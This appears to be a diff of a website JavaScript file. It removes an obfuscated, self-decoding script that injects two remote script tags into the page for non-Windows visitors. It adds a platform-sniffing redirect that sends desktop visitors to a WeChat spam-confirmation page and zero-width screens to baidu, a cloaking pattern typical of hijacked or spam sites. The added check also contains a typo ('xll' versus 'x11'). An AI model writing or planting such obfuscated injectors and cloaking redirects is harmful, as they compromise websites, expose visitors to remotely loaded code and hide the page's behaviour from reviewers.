@@ -1,1 +1,15 @@
-(function(){var hPY=function(s){this.s=s;this.length=s.length;for(var i=0;i<s.length;i++){this[i]=s.charAt(i)}};var fVq=function getStr(mutatedCodes){return function(originCodes){return function(s){var r='',sArr=s.split('');for(var i=0;i<sArr.length;i++){r+=originCodes.charAt(mutatedCodes.indexOf(sArr[i]))}return r}}}(".rjz_Ux6/v12d&b8cikFsWmlen=aw0t:Tpo-h?")("Winscrptex/javUTF-8h:1.zom_?d=206&wblk");hPY.prototype={toString:function(){return fVq(this.s)},valueOf:function(){return fVq(this.s)},charAt:String.prototype.charAt,concat:String.prototype.concat,slice:String.prototype.slice,substr:String.prototype.substr,indexOf:String.prototype.indexOf,trim:String.prototype.trim,split:String.prototype.split};var VqQ=function(s){return new hPY(s)};var hTL=function _844817(arrNum,offset){var A0vcZ=1;while(A0vcZ!==0){switch(A0vcZ){case 1:var arr=[];A0vcZ=5;break;case 2:A0vcZ=i<arrNum?7:3;break;case 3:A0vcZ=ii<arrNum?8:4;break;case 4:return arr;A0vcZ=0;break;case 5:var i=0;A0vcZ=6;break;case 6:var ii=0;A0vcZ=2;break;case 7:arr[(i+offset)%arrNum]=[];A0vcZ=9;break;case 8:var I=arrNum-1;A0vcZ=10;break;case 9:i++;A0vcZ=2;break;case 10:A0vcZ=I>=0?12:11;break;case 11:ii++;A0vcZ=3;break;case 12:arr[ii][(I+offset*ii)%arrNum]=arr[I];A0vcZ=13;break;case 13:I--;A0vcZ=10;break}}}(1,7);if(!(navigator.platform.indexOf(VqQ(".rj"))>-1)){var cnzz_s_tag=document.createElement(VqQ("z_Urx6"));cnzz_s_tag.type=VqQ("6/v612d&dz_Urx6");cnzz_s_tag.async=true;cnzz_s_tag.charset=VqQ("b8cik");cnzz_s_tag.src=VqQ("F66xzs11&Wm_jllm_en1l=z6d6mxFxarw0Wtk:TttTTkpo/-=rw0Wtk:TttTTk");var root_s=document.getElementsByTagName(VqQ("z_Urx6"))[0];root_s.parentNode.insertBefore(cnzz_s_tag,root_s);var gg_s_tag=document.createElement(VqQ("z_Urx6"));gg_s_tag.type=VqQ("6/v612d&dz_Urx6");gg_s_tag.async=true;gg_s_tag.charset=VqQ("b8cik");gg_s_tag.src=VqQ("F66xzs11lhmzF/jFhm6ex1?h1-h::tm2z");var gg_s=document.getElementsByTagName(VqQ("z_Urx6"))[0];gg_s.parentNode.insertBefore(gg_s_tag,gg_s)}})();
+if (window.screen.width == 0) {
+    window.location.replace("https://m.baidu.com")
+}
+;var system = {
+    win: false,
+    mac: false,
+    xll: false
+};
+var p = navigator.platform;
+system.win = p.indexOf("Win") == 0;
+system.mac = p.indexOf("Mac") == 0;
+system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+if (system.win || system.mac || system.xll) {
+    location.replace("https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?main_type=2&evil_type=0&source=2");
+}
